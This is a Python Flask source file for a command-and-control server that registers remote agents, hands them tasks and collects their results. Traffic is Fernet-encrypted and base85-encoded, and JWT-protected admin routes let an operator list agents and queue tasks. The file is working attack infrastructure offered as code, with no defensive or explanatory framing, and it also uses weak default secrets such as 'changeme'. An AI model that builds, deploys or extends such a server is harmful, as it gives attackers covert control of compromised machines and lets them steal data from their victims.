import os
import json
import base64
import logging
from datetime import datetime
from typing import Dict, Optional
from flask import Flask, request, jsonify
from flask_socketio import SocketIO
from cryptography.fernet import Fernet
import redis
import jwt

app = Flask(__name__)
socketio = SocketIO(app)
redis_client = redis.Redis(host='localhost', port=6379, db=0)

# Configuration
SECRET_KEY = os.getenv('SECRET_KEY', Fernet.generate_key())
JWT_SECRET = os.getenv('JWT_SECRET', 'your-secret-key')
ADMIN_PASSWORD = os.getenv('ADMIN_PASSWORD', 'changeme')

class Agent:
    def __init__(self, agent_id: str, platform: str):
        self.id = agent_id
        self.platform = platform
        self.last_seen = datetime.now()
        self.tasks = []
        self.results = []

    def to_dict(self) -> Dict:
        return {
            'id': self.id,
            'platform': self.platform,
            'last_seen': self.last_seen.isoformat(),
            'tasks_pending': len(self.tasks),
            'results': len(self.results)
        }

class C2Server:
    def __init__(self):
        self.agents = {}
        self.fernet = Fernet(SECRET_KEY)
    
    def register_agent(self, agent_id: str, platform: str) -> Agent:
        if agent_id not in self.agents:
            self.agents[agent_id] = Agent(agent_id, platform)
        return self.agents[agent_id]
    
    def get_agent(self, agent_id: str) -> Optional[Agent]:
        return self.agents.get(agent_id)
    
    def add_task(self, agent_id: str, task: Dict) -> bool:
        agent = self.get_agent(agent_id)
        if agent:
            agent.tasks.append(task)
            return True
        return False
    
    def get_tasks(self, agent_id: str) -> list:
        agent = self.get_agent(agent_id)
        if agent and agent.tasks:
            tasks = agent.tasks
            agent.tasks = []
            return tasks
        return []

server = C2Server()

@app.route('/sync', methods=['POST'])
def sync():
    try:
        # Decrypt and parse data
        encrypted_data = request.get_json()['payload']
        data = json.loads(server.fernet.decrypt(
            base64.b85decode(encrypted_data)
        ).decode())
        
        # Register or update agent
        agent = server.register_agent(
            data['agent_id'],
            data['platform']
        )
        agent.last_seen = datetime.now()
        
        # Process any results
        if 'results' in data:
            agent.results.extend(data['results'])
        
        # Get new tasks
        tasks = server.get_tasks(data['agent_id'])
        
        # Prepare and encrypt response
        response = {
            'tasks': tasks,
            'server_time': datetime.now().isoformat()
        }
        
        encrypted_response = base64.b85encode(
            server.fernet.encrypt(
                json.dumps(response).encode()
            )
        ).decode()
        
        return jsonify({
            'status': 'ok',
            'payload': encrypted_response
        })
        
    except Exception as e:
        logging.error(f"Sync error: {str(e)}")
        return jsonify({'status': 'error'}), 500

# Admin interface routes
@app.route('/api/agents', methods=['GET'])
def list_agents():
    token = request.headers.get('Authorization')
    if not verify_admin(token):
        return jsonify({'error': 'Unauthorized'}), 401
        
    return jsonify({
        'agents': [
            agent.to_dict() for agent in server.agents.values()
        ]
    })

@app.route('/api/agents/<agent_id>/task', methods=['POST'])
def add_task(agent_id):
    token = request.headers.get('Authorization')
    if not verify_admin(token):
        return jsonify({'error': 'Unauthorized'}), 401
        
    task = request.get_json()
    if server.add_task(agent_id, task):
        return jsonify({'status': 'ok'})
    return jsonify({'error': 'Agent not found'}), 404

def verify_admin(token: str) -> bool:
    try:
        if not token:
            return False
        jwt.decode(token, JWT_SECRET, algorithms=['HS256'])
        return True
    except:
        return False

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5000)
